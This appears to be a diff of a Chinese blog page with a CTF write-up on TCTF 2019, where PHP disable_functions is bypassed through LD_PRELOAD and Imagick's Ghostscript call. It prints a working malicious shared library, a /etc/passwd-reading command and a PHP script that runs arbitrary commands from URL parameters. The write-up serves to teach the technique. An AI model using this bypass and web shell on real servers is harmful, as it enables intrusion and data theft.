+<pre><code class="hljs crystal">执行命令
+$ nm -D /<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">x86_64</span>-<span class="hljs-title">linux</span>-<span class="hljs-title">gnu</span>/<span class="hljs-title">libc</span>.<span class="hljs-title">so</span>.6</span></code></pre>
+<p><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
+<pre><code class="hljs routeros">执行命令
+$ <span class="hljs-attribute">LD_PRELOAD</span>=<span class="hljs-variable">$PWD</span>/unrandom.so ldd random_num</code></pre>
 
 
 <p>可以发现使用<code>LD_PRELOAD</code>动态链接的共享库优先级高于<code>libc.so.6</code>中的<code>rand()</code>函数，先执行<code>unrandom.so</code>定义的<code>rand()</code>函数。</p>
-<p><strong>所以random_num文件不会输出随机数!!!!</strong><br><img src="./5.png" alt=""></p>
+<p><strong>所以random_num文件不会输出随机数!!!!</strong><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="LD-PRELOAD劫持共享对象"><a href="#LD-PRELOAD劫持共享对象" class="headerlink" title="LD_PRELOAD劫持共享对象"></a>LD_PRELOAD劫持共享对象</h1><p>若PHP.ini启动diable_disfunctions禁用了许多系统操作shell方法,使用LD_PRELOAD劫持系统函数是达不到目的，因为既然你能劫持函数说明shell函数是可执行的。</p>
 <p>那么就要采用LD_PERLOAD劫持共享对象，条件是PHP启动了除PHP解释器外的其他系统进程。</p>
 <h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><p>如PHP调用<code>goFward()</code>方法就能启动新的进程</p>
@@ -211,26 +280,43 @@
 <p>启动PHP解释器-&gt;调用goFward()-&gt;调用c模块move.c-&gt;调用外部程序go.bin</p>
 </blockquote>
 <h2 id="mail-函数产生进程"><a href="#mail-函数产生进程" class="headerlink" title="mail()函数产生进程"></a>mail()函数产生进程</h2><p>php中<code>mail()</code>函数就能产生新的系统进程</p>
-<h3 id="创建mail方法"><a href="#创建mail方法" class="headerlink" title="创建mail方法"></a>创建mail方法</h3><p><img src="./6.png" alt=""></p>
+<h3 id="创建mail方法"><a href="#创建mail方法" class="headerlink" title="创建mail方法"></a>创建mail方法</h3><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p>
 <h3 id="追踪函数调用情况，发现调用了外部程序"><a href="#追踪函数调用情况，发现调用了外部程序" class="headerlink" title="追踪函数调用情况，发现调用了外部程序"></a>追踪函数调用情况，发现调用了外部程序</h3><p>可以看到除了启动PHP解释器外，还启用了sendmail</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace-f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve</span><br></pre></td></tr></table></figure>
-<p><img src="./7.png" alt=""></p>
+<pre><code class="hljs angelscript">strace-f php mail.php <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep -A2 -B2 execve</code></pre>
+<p><img src="./7.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="利用imagick实现共享对象劫持"><a href="#利用imagick实现共享对象劫持" class="headerlink" title="利用imagick实现共享对象劫持"></a>利用imagick实现共享对象劫持</h1><p>TCTF中<code>mail()</code>方法不可用，题目提示<code>imagick</code>扩展方法。</p>
 <p><code>imagick</code>对<code>eps</code>文件解析时候会调用系统进程</p>
 <p>在当前目录下存放有效的123.eps文件，编辑文image.php件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new Imagick(&#39;123.eps&#39;);</span><br></pre></td></tr></table></figure>
-<p>发现调用了<code>gs</code>进程，这样我们就能构造c文件，使得<code>LD_PRELOAD</code>劫持共享对象，并输入想要执行的<code>shell</code>命令<br><img src="./8.png" alt=""></p>
-<h2 id="创建Bypass-c"><a href="#创建Bypass-c" class="headerlink" title="创建Bypass.c"></a>创建Bypass.c</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">int __attribute__((__constructor__)) init(void)</span><br><span class="line">&#123;	</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">	system(&quot;cat &#x2F;etc&#x2F;passwd&gt;.&#x2F;456.txt 2&gt;&amp;1&quot;);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php">$a = <span class="hljs-keyword">new</span> Imagick(<span class="hljs-string">'123.eps'</span>);</span></code></pre>
+<p>发现调用了<code>gs</code>进程，这样我们就能构造c文件，使得<code>LD_PRELOAD</code>劫持共享对象，并输入想要执行的<code>shell</code>命令<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="创建Bypass-c"><a href="#创建Bypass-c" class="headerlink" title="创建Bypass.c"></a>创建Bypass.c</h2><pre><code class="hljs autoit">
+<span class="hljs-meta">#define _GNU_SOURCE</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
+
+<span class="hljs-built_in">int</span> __attribute__((__constructor__)) init(void)
+&#123;	
+unsetenv(<span class="hljs-string">"LD_PRELOAD"</span>)<span class="hljs-comment">;</span>
+	system(<span class="hljs-string">"cat /etc/passwd&gt;./456.txt 2&gt;&amp;1"</span>)<span class="hljs-comment">;</span>
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span>
+
+&#125;</code></pre>
 <p><code>unsetenv</code>删除<code>LD_PRELOADA</code>环境变量，否则进程一直打开，会无限循环，这是不愿意看到的行为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编译</span><br><span class="line">$ gcc -shared -fPIC bypass.c -o bypass.so</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mipsasm">编译
+$ gcc -<span class="hljs-keyword">shared </span>-fPIC <span class="hljs-keyword">bypass.c </span>-o <span class="hljs-keyword">bypass.so</span></code></pre>
 
 
-<h2 id="创建image-php文件"><a href="#创建image-php文件" class="headerlink" title="创建image.php文件"></a>创建image.php文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;&#x2F;home&#x2F;od0d&#x2F;tmpdir&#x2F;bypass.so&quot;);</span><br><span class="line">$a &#x3D; new Imagick(&#39;123.eps&#39;);</span><br></pre></td></tr></table></figure>
+<h2 id="创建image-php文件"><a href="#创建image-php文件" class="headerlink" title="创建image.php文件"></a>创建image.php文件</h2><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php">putenv(<span class="hljs-string">"LD_PRELOAD=/home/od0d/tmpdir/bypass.so"</span>);</span>
+<span class="php">$a = <span class="hljs-keyword">new</span> Imagick(<span class="hljs-string">'123.eps'</span>);</span></code></pre>
 
-<p>终端执行命令<code>php -f ./image.php</code><br>在当前目录输出了文件<br><img src="./9.png" alt=""></p>
-<h1 id="TCTF"><a href="#TCTF" class="headerlink" title="TCTF"></a>TCTF</h1><p>TCTF禁用函数如下<br><img src="./13.png" alt=""></p>
+<p>终端执行命令<code>php -f ./image.php</code><br>在当前目录输出了文件<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="TCTF"><a href="#TCTF" class="headerlink" title="TCTF"></a>TCTF</h1><p>TCTF禁用函数如下<br><img src="./13.png" srcset="/img/loading.gif" alt=""></p>
 <p>根据以上分析构造的php文件需要满足如下要求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C中命令</span><br><span class="line">cat &#x2F;etc&#x2F;passwd &gt; .&#x2F;456.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs angelscript">C中命令
+cat /etc/passwd &gt; ./<span class="hljs-number">456.</span>txt <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span></code></pre>
 
 
 <blockquote>
@@ -245,172 +331,309 @@
 <li>C文件函数需要添加<strong>attribute</strong> ((<strong>constructor</strong>))</li>
 </ol>
 <p>使用Imagick触发/usr/bin/gs打开无效.eps文件<br>编写共享库和php文件并执行，成功获取系统信息</p>
-<p><img src="./10.png" alt=""><br><img src="./11.png" alt=""></p>
-<p><code>http://172.17.0.1:8888/imagebypass.php?cmd=/readflag&amp;outpath=/var/www/html/324.txt&amp;sopath=/var/www/html/bypass.so</code><br><img src="./12.png" alt=""></p>
-<h1 id="文件源码"><a href="#文件源码" class="headerlink" title="文件源码"></a>文件源码</h1><h2 id="123-eps-怕忘了这个文件，随手加"><a href="#123-eps-怕忘了这个文件，随手加" class="headerlink" title="123.eps(怕忘了这个文件，随手加)"></a>123.eps(怕忘了这个文件，随手加)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim 123.eps</span><br></pre></td></tr></table></figure>
-<p><img src="./14.png" alt=""></p>
-<h2 id="bypass-c"><a href="#bypass-c" class="headerlink" title="bypass.c"></a>bypass.c</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;   </span><br><span class="line"></span><br><span class="line">	unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; get command line options and arg</span><br><span class="line">    const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="./10.png" srcset="/img/loading.gif" alt=""><br><img src="./11.png" srcset="/img/loading.gif" alt=""></p>
+<p><code>http://172.17.0.1:8888/imagebypass.php?cmd=/readflag&amp;outpath=/var/www/html/324.txt&amp;sopath=/var/www/html/bypass.so</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="文件源码"><a href="#文件源码" class="headerlink" title="文件源码"></a>文件源码</h1><h2 id="123-eps-怕忘了这个文件，随手加"><a href="#123-eps-怕忘了这个文件，随手加" class="headerlink" title="123.eps(怕忘了这个文件，随手加)"></a>123.eps(怕忘了这个文件，随手加)</h2><pre><code class="hljs gams"><span class="hljs-symbol">$</span> vim <span class="hljs-number">123.</span><span class="hljs-literal">eps</span></code></pre>
+<p><img src="./14.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="bypass-c"><a href="#bypass-c" class="headerlink" title="bypass.c"></a>bypass.c</h2><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span>
 
-<h2 id="bypassimage-php"><a href="#bypassimage-php" class="headerlink" title="bypassimage.php"></a>bypassimage.php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$cmd &#x3D; $_GET[&quot;cmd&quot;];</span><br><span class="line"></span><br><span class="line">$out_path &#x3D; $_GET[&quot;outpath&quot;];</span><br><span class="line">$evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">$so_path &#x3D; $_GET[&quot;sopath&quot;];</span><br><span class="line"></span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline);</span><br><span class="line">$a &#x3D; new Imagick(&#39;123.eps&#39;);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+
+
+
+<span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span>** environ;
+
+__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>
+<span class="hljs-function"></span>&#123;   
+
+	unsetenv(<span class="hljs-string">"LD_PRELOAD"</span>);
+
+    <span class="hljs-comment">// get command line options and arg</span>
+    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmdline = getenv(<span class="hljs-string">"EVIL_CMDLINE"</span>);
+
+    <span class="hljs-comment">// executive command</span>
+    system(cmdline);
+&#125;</code></pre>
+
+<h2 id="bypassimage-php"><a href="#bypassimage-php" class="headerlink" title="bypassimage.php"></a>bypassimage.php</h2><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span>
+
+<span class="php">$cmd = $_GET[<span class="hljs-string">"cmd"</span>];</span>
+
+<span class="php">$out_path = $_GET[<span class="hljs-string">"outpath"</span>];</span>
+<span class="php">$evil_cmdline = $cmd . <span class="hljs-string">" &gt; "</span> . $out_path . <span class="hljs-string">" 2&gt;&amp;1"</span>;</span>
+
+<span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="hljs-string">"&lt;/p&gt;"</span>;</span>
+
+<span class="php">putenv(<span class="hljs-string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span>
+
+<span class="php">$so_path = $_GET[<span class="hljs-string">"sopath"</span>];</span>
+
+<span class="php">putenv(<span class="hljs-string">"LD_PRELOAD="</span> . $so_path);</span>
+
+<span class="php">putenv(<span class="hljs-string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span>
+<span class="php">$a = <span class="hljs-keyword">new</span> Imagick(<span class="hljs-string">'123.eps'</span>);</span>
+
+<span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="hljs-string">"&lt;/p&gt;"</span>;</span></code></pre>
 
 
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/" target="_blank" rel="noopener">LD_PRELOAD 劫持系统函数的能力</a><br><a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md" target="_blank" rel="noopener">TCTF2019/Wallbreaker_Easy WP</a><br><a href="https://paper.tuisec.win/detail/d4ba64dd4d1dc38" target="_blank" rel="noopener">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/" target="_blank" rel="noopener">TCTF2019 Web WP</a></p>
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/04/06/RingZer0-CTF-web-sql-WP/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">RingZer0_CTF_web-sql WP</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/03/24/session%E5%8F%8D-%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/">
+                        <span class="hidden-mobile">session处理器使用不当导致对象注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD解释"><span class="toc-number">3.</span> <span class="toc-text">LD_PRELOAD解释</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD劫持系统函数操作"><span class="toc-number">4.</span> <span class="toc-text">LD_PRELOAD劫持系统函数操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#创建c文件random-num-c生成随机数"><span class="toc-number">4.1.</span> <span class="toc-text">创建c文件random_num.c生成随机数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译random-num-c生成可执行文件random-num"><span class="toc-number">4.2.</span> <span class="toc-text">编译random_num.c生成可执行文件random_num</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#创建unrandom-c文件"><span class="toc-number">4.3.</span> <span class="toc-text">创建unrandom.c文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#执行random-num"><span class="toc-number">4.4.</span> <span class="toc-text">执行random_num</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD劫持系统函数原理"><span class="toc-number">5.</span> <span class="toc-text">LD_PRELOAD劫持系统函数原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD劫持共享对象"><span class="toc-number">6.</span> <span class="toc-text">LD_PRELOAD劫持共享对象</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#方式"><span class="toc-number">6.1.</span> <span class="toc-text">方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mail-函数产生进程"><span class="toc-number">6.2.</span> <span class="toc-text">mail()函数产生进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#创建mail方法"><span class="toc-number">6.2.1.</span> <span class="toc-text">创建mail方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#追踪函数调用情况，发现调用了外部程序"><span class="toc-number">6.2.2.</span> <span class="toc-text">追踪函数调用情况，发现调用了外部程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用imagick实现共享对象劫持"><span class="toc-number">7.</span> <span class="toc-text">利用imagick实现共享对象劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#创建Bypass-c"><span class="toc-number">7.1.</span> <span class="toc-text">创建Bypass.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#创建image-php文件"><span class="toc-number">7.2.</span> <span class="toc-text">创建image.php文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TCTF"><span class="toc-number">8.</span> <span class="toc-text">TCTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件源码"><span class="toc-number">9.</span> <span class="toc-text">文件源码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#123-eps-怕忘了这个文件，随手加"><span class="toc-number">9.1.</span> <span class="toc-text">123.eps(怕忘了这个文件，随手加)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-c"><span class="toc-number">9.2.</span> <span class="toc-text">bypass.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypassimage-php"><span class="toc-number">9.3.</span> <span class="toc-text">bypassimage.php</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&text=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&is_video=false&description=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=TCTF | LD_PRELOAD系统劫持绕过disable_functions&body=Check out this article: http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&name=TCTF | LD_PRELOAD系统劫持绕过disable_functions&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&t=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
